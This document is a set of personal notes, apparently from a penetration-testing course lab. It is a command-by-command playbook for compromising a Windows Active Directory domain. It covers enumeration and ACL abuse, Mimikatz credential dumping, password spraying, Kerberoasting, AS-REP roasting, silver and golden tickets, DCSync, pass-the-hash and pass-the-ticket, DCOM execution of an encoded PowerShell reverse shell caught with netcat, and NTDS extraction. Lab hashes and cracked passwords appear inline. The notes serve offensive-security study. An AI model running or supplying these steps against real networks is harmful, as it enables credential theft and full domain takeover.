### Enumertaion 
```
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetGroup | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
```

```
Find-LocalAdminAccess
Get-NetSession -ComputerName web04 -Verbose

Get-NetSession -ComputerName client74

Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

.\PsLoggedon.exe \\files04
```

### SPN
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Enumerating Object Permissions
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

```
Get-ObjectAcl -Identity <user>
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

#exploit
net group "Management Department" <user> /add /domain
```
External site https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
```
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
Powerview - https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
```
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### Domain Shares
```
Find-DomainShare
ls \\dc1.corp.com\sysvol\corp.com\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml     # Password cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

### Mimikatz
```
privilege::debug
sekurlsa::logonpasswords

## Access the SMB
dir \\web04.corp.com\backup
sekurlsa::tickets                         # Group 0 - Ticket Granting Service and Group 2 - Ticket Granting Ticket
```
## Authentication Attack
### Password Spraying from Windows 
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
### AS-REP Roasting
```
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# From winows
.\Rubeus.exe asreproast /nowrap
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
### Kerberoasting
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
cat hashes.kerberoast
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

## Linux 
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Silver Ticket 
```
Access any web or smbshare
iwr -UseDefaultCredentials http://web04

##Mimikatz
privilege::debug
sekurlsa::logonpasswords                 # found iis service hash NTLM     : 4d28cf5252d39971419580a51484ca09
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
klist
iwr -UseDefaultCredentials http://web04   # it will work
```
### Domain Controller Synchronization (DCsync attack)
```
.\mimikatz.exe
lsadump::dcsync /user:corp\dave         #   Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
lsadump::dcsync /user:corp\Administrator  # Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
Cracked Administrator hash found BrouhahaTungPerorateBroom2023!
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

## Lateral Movement 
### PSEXEC 
Pre-req: Administrators local group, ADMIN$ share must be available, and third, File and Printer Sharing has to be turned on
```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
### PASS-THE HASH 
```
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
### Overpass the Hash
abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT).
```
mimikatz
privilege::debug
sekurlsa::logonpasswords    # NTLM : 369def79d8372408bf6e93364cc93075 and username Jen
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
klist        # if its 0 thats fine
net use \\files04
klist
.\PsExec.exe \\files04 cmd
```
### Pass the Ticket
Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. 
```
ls \\web04\backup                # '\\web04\backup' is denied.

Mimikatz
privilege::debug
sekurlsa::tickets /export
dir *.kirbi                             # -a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
klist
ls \\web04\backup
```

### DCOM
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
tasklist | findstr "calc"
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")

$ kali: nc -lnvp 443
whoami
hostname
```
### Golden ticket 
```
PsExec64.exe \\DC1 cmd.exe

Mimikatz
privilege::debug
lsadump::lsa /patch                             # User : krbtgt  NTLM : 1693c6cefafffc7af11ef34d1c788f47
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd
PsExec.exe \\dc1 cmd.exe
whoami /groups                    # will be in Admin Group

#time check 
check for clock-skew through nmap 
```

### vshadow.exe
```
vshadow.exe -nw -p  C:                                # - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
